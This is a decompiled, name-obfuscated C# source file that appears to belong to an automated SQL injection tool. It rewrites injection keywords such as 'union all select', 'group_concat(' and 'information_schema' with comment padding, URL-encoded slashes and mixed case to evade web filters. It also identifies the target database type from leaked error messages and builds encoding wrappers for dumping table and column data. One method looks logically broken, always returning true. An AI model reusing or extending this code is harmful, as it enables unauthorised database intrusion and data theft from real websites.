using System.Collections.Generic;
using System.Text;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class54
{
	public static string string_0 = "~";

	public static string string_1 = Class23.smethod_20(string_0);

	public static string string_2 = "|";

	public static string string_3 = Class23.smethod_20(string_2);

	public static string string_4 = "+";

	public static int int_0;

	public static bool bool_0;

	private static string string_5 = "union all;select;distinct;from;where;limit;order by;group by;substring(;concat(;concat_ws(;group_concat(;load_file(;convert(;cast(;hex(;unhex(;user();system_user;version();@@version;database();DB_NAME();mysql;`information_schema`;schemata;schema_name;tables;table_name;table_schema;columns;column_name;column_schema;master;sysdatabases;sysobjects;syscolumns";

	private static Dictionary<string, string> dictionary_0;

	public static void smethod_0()
	{
		dictionary_0 = new Dictionary<string, string>();
		string[] array = string_5.Split(';');
		foreach (string text in array)
		{
			if (!string.IsNullOrEmpty(text))
			{
				string text2 = "%2f**%2f" + Class23.smethod_22(text);
				text2 = text2.Replace(" ", "%2f**%2f");
				dictionary_0.Add(text, "%2f**%2f" + text2);
			}
		}
	}

	internal static void smethod_1(ref string string_6)
	{
		string_6 = string_6.Replace("/**//**/", "/**/");
		string_6 = string_6.Replace("++", "+");
		string_6 = string_6.Replace("----", "--");
		string_6 = string_6.Replace("/**/", " ");
		string_6 = string_6.Replace("%2f**%2f", " ");
		string_6 = string_6.Replace("%2f", " ");
		string_6 = string_6.Replace("  ", " ");
		string_6 = string_6.Replace("/%2A%2A/", " ");
		string_6 = string_6.Replace("%0b", " ");
		string_6 = string_6.Replace("+union+all+select+", " union all select ");
		string_6 = string_6.Replace("+select+", " select ");
		string_6 = smethod_2(string_6, "unhex(", "|4nh3x(");
		string_6 = smethod_2(string_6, "group_concat(", "|g_r0up_c0nc4t(");
		foreach (KeyValuePair<string, string> item in dictionary_0)
		{
			string_6 = smethod_2(string_6, item.Key, item.Value);
		}
		string_6 = string_6.Replace("d.schema_name", "d.sChEmA_nAmE");
		string_6 = string_6.Replace("t.table_name", "t.tAblE_nAmE");
		string_6 = string_6.Replace("c.column_name", "c.cOlUmN_nAmE");
		string_6 = smethod_2(string_6, "|4nh3x(", dictionary_0["unhex("]);
		string_6 = smethod_2(string_6, "|g_r0up_c0nc4t(", dictionary_0["group_concat("]);
		string_6 = string_6.Replace("  ", " ");
		string_6 = string_6.Replace(" (", "(");
		string_6 = string_6.Replace("(+", "(");
		string_6 = string_6.Replace(")(", ")+(");
		string_6 = string_6.Replace("++", "+");
		if (!string.IsNullOrEmpty(string_4))
		{
			string_6 = string_6.Replace(" ", string_4);
		}
		string_6 = string_6.Trim();
	}

	private static string smethod_2(string string_6, string string_7, string string_8)
	{
		int length = string_7.Length;
		checked
		{
			int num = default(int);
			while (num <= string_6.Length - 1)
			{
				bool flag = false;
				num = string_6.ToLower().IndexOf(string_7.ToLower(), num);
				if (num <= 0)
				{
					break;
				}
				if (string_7.EndsWith("("))
				{
					flag = true;
				}
				else
				{
					string[] array = new string[2];
					if (num + length + 1 >= string_6.Length)
					{
						array[0] = "";
					}
					else
					{
						array[0] = string_6.Substring(num + length, 1);
					}
					array[1] = string_6.Substring(num - 1, 1);
					if (((Operators.CompareString(array[0], "", TextCompare: false) == 0) | (Operators.CompareString(array[0], " ", TextCompare: false) == 0) | (Operators.CompareString(array[0], ",", TextCompare: false) == 0) | (Operators.CompareString(array[0], "=", TextCompare: false) == 0) | (Operators.CompareString(array[0], "+", TextCompare: false) == 0) | (Operators.CompareString(array[0], ")", TextCompare: false) == 0) | (Operators.CompareString(array[0], "(", TextCompare: false) == 0) | (Operators.CompareString(array[0], "]", TextCompare: false) == 0) | (Operators.CompareString(array[0], "[", TextCompare: false) == 0) | (Operators.CompareString(array[0], ".", TextCompare: false) == 0)) & ((Operators.CompareString(array[1], "", TextCompare: false) == 0) | (Operators.CompareString(array[1], " ", TextCompare: false) == 0) | (Operators.CompareString(array[1], ",", TextCompare: false) == 0) | (Operators.CompareString(array[1], "=", TextCompare: false) == 0) | (Operators.CompareString(array[1], "+", TextCompare: false) == 0) | (Operators.CompareString(array[1], ")", TextCompare: false) == 0) | (Operators.CompareString(array[1], "(", TextCompare: false) == 0) | (Operators.CompareString(array[1], "]", TextCompare: false) == 0) | (Operators.CompareString(array[1], "[", TextCompare: false) == 0) | (Operators.CompareString(array[1], ".", TextCompare: false) == 0)))
					{
						flag = true;
					}
				}
				if (flag)
				{
					string_6 = string_6.Remove(num, length);
					string_6 = string_6.Insert(num, string_8);
				}
				num += string_8.Length;
			}
			return string_6;
		}
	}

	public static Types smethod_3(string string_6)
	{
		if (string.IsNullOrEmpty(string_6))
		{
			return Types.None;
		}
		string_6 = string_6.ToLower();
		bool flag;
		if ((flag = true) == string_6.IndexOf("Dork SQL Injection".ToLower()) >= 0 || flag == string_6.IndexOf("SQL Dork".ToLower()) >= 0 || flag == string_6.IndexOf("Dorks".ToLower()) >= 0 || flag == string_6.IndexOf("SQL Injection".ToLower()) >= 0)
		{
			return Types.None;
		}
		bool flag2;
		if ((flag2 = true) == string_6.IndexOf("mysql_num_rows()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_array()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_result()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_query()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_assoc()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_numrows()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_row()".ToLower()) >= 0 || flag2 == string_6.IndexOf("mysql_fetch_object()".ToLower()) >= 0 || flag2 == string_6.IndexOf("JDBC MySQL()".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL Error".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("on MySQL result index".ToLower()) >= 0 || flag2 == string_6.IndexOf("supplied argument is not a valid MySQL result resource".ToLower()) >= 0 || flag2 == string_6.IndexOf("MySQL server version for the right syntax to use near".ToLower()) >= 0 || flag2 == string_6.IndexOf("Driver][mysqld".ToLower()) >= 0 || flag2 == (string_6.IndexOf("Duplicate entry".ToLower()) >= 0 && string_6.IndexOf("for key 'PRIMARY'".ToLower()) >= 0))
		{
			return Types.MySQL_Unknown;
		}
		if (flag2 == string_6.IndexOf("Microsoft OLE DB Provider for ODBC Drivers error".ToLower()) >= 0 || flag2 == string_6.IndexOf("[Microsoft][ODBC SQL Server Driver][SQL Server]".ToLower()) >= 0 || flag2 == string_6.IndexOf("ODBC Drivers error '80040e14'".ToLower()) >= 0 || flag2 == string_6.IndexOf("ODBC SQL Server Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("JDBC SQL".ToLower()) >= 0 || flag2 == string_6.IndexOf("Microsoft OLE DB Provider for SQL Server".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unclosed quotation mark".ToLower()) >= 0 || flag2 == string_6.IndexOf("VBScript Runtime".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQLServer JDBC Driver".ToLower()) >= 0)
		{
			return Types.MSSQL_Unknown;
		}
		if (flag2 == string_6.IndexOf("ORA-0".ToLower()) >= 0 || flag2 == string_6.IndexOf("ORA-1".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle DB2".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle Driver".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle Error".ToLower()) >= 0 || flag2 == string_6.IndexOf("Oracle ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("MM_XSLTransform error".ToLower()) >= 0 || flag2 == string_6.IndexOf("[Macromedia][Oracle JDBC Driver][Oracle]ORA-".ToLower()) >= 0 || flag2 == string_6.IndexOf("ociexecute(): OCIStmtExecute:".ToLower()) >= 0 || flag2 == string_6.IndexOf("ORA-1".ToLower()) >= 0)
		{
			return Types.Oracle_Unknown;
		}
		if (flag2 == ((string_6.IndexOf("[Microsoft][ODBC Microsoft Access Driver]".ToLower()) >= 0) & (string_6.IndexOf("WHERE".ToLower()) <= 0)) || flag2 == ((string_6.IndexOf("ODBC Microsoft Access Driver".ToLower()) >= 0) & (string_6.IndexOf("WHERE".ToLower()) <= 0)) || flag2 == string_6.IndexOf("ocifetch(): OCIFetch:".ToLower()) >= 0)
		{
			return Types.MsAccess;
		}
		if (flag2 == string_6.IndexOf("Warning: pg_exec() ".ToLower()) >= 0 || flag2 == string_6.IndexOf("function.pg-exec".ToLower()) >= 0 || flag2 == string_6.IndexOf("target_user:target_db:PostgreSQL".ToLower()) >= 0 || flag2 == string_6.IndexOf("PostgreSQL query failed".ToLower()) >= 0 || flag2 == string_6.IndexOf("Supplied argument is not a valid PostgreSQL result".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_fetch_array()".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_query()".ToLower()) >= 0 || flag2 == string_6.IndexOf("pg_fetch_assoc()".ToLower()) >= 0 || flag2 == string_6.IndexOf("function.pg-query".ToLower()) >= 0)
		{
			return Types.PostgreSQL_Unknown;
		}
		if (flag2 == string_6.IndexOf("com.sybase.jdbc2.jdbc.SybSQLException".ToLower()) >= 0 || flag2 == string_6.IndexOf("SybSQLException".ToLower()) >= 0)
		{
			return Types.Sybase;
		}
		if (flag2 == string_6.IndexOf("Error Executing Database Query".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODB.Command".ToLower()) >= 0 || flag2 == string_6.IndexOf("BOF or EOF".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODB.Field".ToLower()) >= 0 || flag2 == string_6.IndexOf("sql error".ToLower()) >= 0 || flag2 == string_6.IndexOf("syntax error".ToLower()) >= 0 || flag2 == string_6.IndexOf("OLE DB Provider for ODBC".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODBCommand".ToLower()) >= 0 || flag2 == string_6.IndexOf("ADODBField".ToLower()) >= 0 || flag2 == string_6.IndexOf("A syntax error has occurred".ToLower()) >= 0 || flag2 == string_6.IndexOf("Custom Error Message".ToLower()) >= 0 || flag2 == string_6.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == string_6.IndexOf("Error Report".ToLower()) >= 0 || flag2 == string_6.IndexOf("Error converting data type varchar to numeric".ToLower()) >= 0 || flag2 == string_6.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQL command not properly ended".ToLower()) >= 0 || flag2 == string_6.IndexOf("Types mismatch".ToLower()) >= 0 || flag2 == string_6.IndexOf("invalid query".ToLower()) >= 0 || flag2 == string_6.IndexOf("unexpected end of SQL command".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unclosed quotation mark before the character string".ToLower()) >= 0 || flag2 == string_6.IndexOf("Unterminated string constant".ToLower()) >= 0 || flag2 == string_6.IndexOf("SQLException".ToLower()) >= 0 || flag2 == string_6.IndexOf("DBObject::doQuery".ToLower()) >= 0)
		{
			return Types.Unknown;
		}
		return Types.None;
	}

	public static string smethod_4(MySQLCollactions mySQLCollactions_0)
	{
		string result = "";
		switch (mySQLCollactions_0)
		{
		case MySQLCollactions.None:
			result = "#";
			break;
		case MySQLCollactions.UnHex:
			result = "unhex(hex(#))";
			break;
		case MySQLCollactions.Binary:
			result = "binary(#)";
			break;
		case MySQLCollactions.CastAsChar:
			result = "cast(# as char)";
			break;
		case MySQLCollactions.Compress:
			result = "uncompress(compress(#))";
			break;
		case MySQLCollactions.ConvertUtf8:
			result = "convert(# using utf8)";
			break;
		case MySQLCollactions.ConvertLatin1:
			result = "convert(# using latin1)";
			break;
		case MySQLCollactions.Aes_descrypt:
			result = "aes_decrypt(aes_encrypt(#,1),1)";
			break;
		}
		return result;
	}

	public static string smethod_5(Types types_0)
	{
		return types_0 switch
		{
			Types.MySQL_Unknown => "MySQL", 
			Types.MySQL_No_Error => "MySQL Union", 
			Types.MySQL_With_Error => "MySQL Error", 
			Types.MSSQL_Unknown => "MS SQL", 
			Types.MSSQL_No_Error => "MS SQL Union", 
			Types.MSSQL_With_Error => "MS SQL Error", 
			Types.Oracle_Unknown => "Oracle", 
			Types.Oracle_No_Error => "Oracle Union", 
			Types.Oracle_With_Error => "Oracle Error", 
			Types.PostgreSQL_Unknown => "PostgreSQL", 
			Types.PostgreSQL_No_Error => "PostgreSQL Union", 
			Types.PostgreSQL_With_Error => "PostgreSQL Error", 
			Types.MsAccess => "MS Access", 
			Types.Sybase => "Sybase", 
			_ => "Unknown", 
		};
	}

	public static Types smethod_6(string string_6)
	{
		uint num = Class55.smethod_0(string_6);
		if (num <= 2257895059u)
		{
			if (num <= 564815639)
			{
				if (num <= 66782414)
				{
					switch (num)
					{
					case 66782414u:
						if (Operators.CompareString(string_6, "MySQL Union", TextCompare: false) == 0)
						{
							return Types.MySQL_No_Error;
						}
						break;
					case 37244055u:
						if (Operators.CompareString(string_6, "MySQL Error", TextCompare: false) == 0)
						{
							return Types.MySQL_With_Error;
						}
						break;
					}
				}
				else if (num != 254357513)
				{
					if (num == 564815639 && Operators.CompareString(string_6, "Oracle", TextCompare: false) == 0)
					{
						goto IL_00a5;
					}
				}
				else if (Operators.CompareString(string_6, "Oracle Unknown", TextCompare: false) == 0)
				{
					goto IL_00a5;
				}
			}
			else if (num <= 1692667312)
			{
				switch (num)
				{
				case 1692667312u:
					if (Operators.CompareString(string_6, "PostgreSQL Union", TextCompare: false) == 0)
					{
						return Types.PostgreSQL_No_Error;
					}
					break;
				case 1355770817u:
					if (Operators.CompareString(string_6, "Oracle Error", TextCompare: false) == 0)
					{
						return Types.Oracle_With_Error;
					}
					break;
				}
			}
			else if (num != 1828015845)
			{
				if (num != 1980319588)
				{
					if (num == 2257895059u && Operators.CompareString(string_6, "PostgreSQL", TextCompare: false) == 0)
					{
						goto IL_0155;
					}
				}
				else if (Operators.CompareString(string_6, "Oracle Union", TextCompare: false) == 0)
				{
					return Types.Oracle_No_Error;
				}
			}
			else if (Operators.CompareString(string_6, "PostgreSQL Unknown", TextCompare: false) == 0)
			{
				goto IL_0155;
			}
		}
		else if (num <= 3393495623u)
		{
			if (num <= 2712581519u)
			{
				if (num != 2642409342u)
				{
					if (num == 2712581519u && Operators.CompareString(string_6, "MySQL Unknown", TextCompare: false) == 0)
					{
						goto IL_025e;
					}
				}
				else if (Operators.CompareString(string_6, "MS SQL Union", TextCompare: false) == 0)
				{
					return Types.MSSQL_No_Error;
				}
			}
			else
			{
				switch (num)
				{
				case 3393495623u:
					if (Operators.CompareString(string_6, "MS SQL Error", TextCompare: false) == 0)
					{
						return Types.MSSQL_With_Error;
					}
					break;
				case 3122682809u:
					if (Operators.CompareString(string_6, "MS Access", TextCompare: false) == 0)
					{
						return Types.MsAccess;
					}
					break;
				}
			}
		}
		else if (num <= 3533499743u)
		{
			if (num != 3449612908u)
			{
				if (num == 3533499743u && Operators.CompareString(string_6, "MS SQL Unknown", TextCompare: false) == 0)
				{
					goto IL_0270;
				}
			}
			else if (Operators.CompareString(string_6, "Sybase", TextCompare: false) == 0)
			{
				return Types.Sybase;
			}
		}
		else if (num != 3849275053u)
		{
			if (num != 4101455373u)
			{
				if (num == 4196966397u && Operators.CompareString(string_6, "MySQL", TextCompare: false) == 0)
				{
					goto IL_025e;
				}
			}
			else if (Operators.CompareString(string_6, "MS SQL", TextCompare: false) == 0)
			{
				goto IL_0270;
			}
		}
		else if (Operators.CompareString(string_6, "PostgreSQL Error", TextCompare: false) == 0)
		{
			return Types.PostgreSQL_With_Error;
		}
		return Types.Unknown;
		IL_025e:
		return Types.MySQL_Unknown;
		IL_0155:
		return Types.PostgreSQL_Unknown;
		IL_00a5:
		return Types.Oracle_Unknown;
		IL_0270:
		return Types.MSSQL_Unknown;
	}

	public static string smethod_7(List<string> list_0, bool bool_1 = false, bool bool_2 = false, bool bool_3 = false, bool bool_4 = false)
	{
		Conversions.ToString(Interaction.IIf(bool_4, "convert(# using utf8)", "#"));
		string newValue = Conversions.ToString(Interaction.IIf(bool_1, "unhex(hex(#))", "#"));
		string newValue2 = Conversions.ToString(Interaction.IIf(bool_3, "hex(#)", "#"));
		string newValue3 = Conversions.ToString(Interaction.IIf(bool_2, "cast(# as char)", "#"));
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = list_0.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = list_0[i].Replace("#", Conversions.ToString(bool_4));
				text = text.Replace("#", newValue2);
				text = text.Replace("#", newValue);
				text = text.Replace("#", newValue3);
				int num2 = i;
				if (num2 == 0)
				{
					stringBuilder.Append(text);
				}
				else if (num2 == list_0.Count - 1)
				{
					stringBuilder.Append(text);
				}
				else
				{
					stringBuilder.Append("," + text);
				}
			}
			return stringBuilder.ToString();
		}
	}

	public static string smethod_8(List<string> list_0, bool bool_1, bool bool_2 = false, bool bool_3 = true)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = list_0.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = ((!bool_1) ? Class23.smethod_21(list_0[i], bool_3) : Class23.smethod_20(list_0[i]));
				int num2 = i;
				if (num2 == 0)
				{
					stringBuilder.Append(text);
				}
				else if (num2 == list_0.Count - 1)
				{
					stringBuilder.Append(text);
				}
				else
				{
					stringBuilder.Append("," + text);
				}
			}
			return stringBuilder.ToString();
		}
	}

	public static bool smethod_9(Types types_0)
	{
		return types_0 == Types.MySQL_No_Error || types_0 == Types.MySQL_With_Error || types_0 == Types.MySQL_Unknown;
	}

	public static bool smethod_10(Types types_0)
	{
		return types_0 == Types.MSSQL_No_Error || types_0 == Types.MSSQL_With_Error || types_0 == Types.MSSQL_Unknown;
	}

	public static bool smethod_11(Types types_0)
	{
		return types_0 == Types.Oracle_No_Error || types_0 == Types.Oracle_With_Error || types_0 == Types.Oracle_Unknown;
	}

	public static bool smethod_12(Types types_0)
	{
		return types_0 == Types.PostgreSQL_No_Error || types_0 == Types.PostgreSQL_With_Error || types_0 == Types.PostgreSQL_Unknown;
	}

	public static bool smethod_13(Types types_0)
	{
		return types_0 == Types.MySQL_With_Error || types_0 == Types.MSSQL_With_Error || types_0 == Types.Oracle_With_Error || types_0 == Types.PostgreSQL_With_Error;
	}

	public static bool smethod_14(Types types_0)
	{
		return ((0 - ((types_0 == Types.MySQL_With_Error) ? 1 : 0)) | 3 | (0 - ((types_0 == Types.MSSQL_With_Error) ? 1 : 0)) | 6 | (0 - ((types_0 == Types.Oracle_With_Error) ? 1 : 0)) | 9 | (0 - ((types_0 == Types.PostgreSQL_With_Error) ? 1 : 0)) | 0xC) != 0;
	}
}
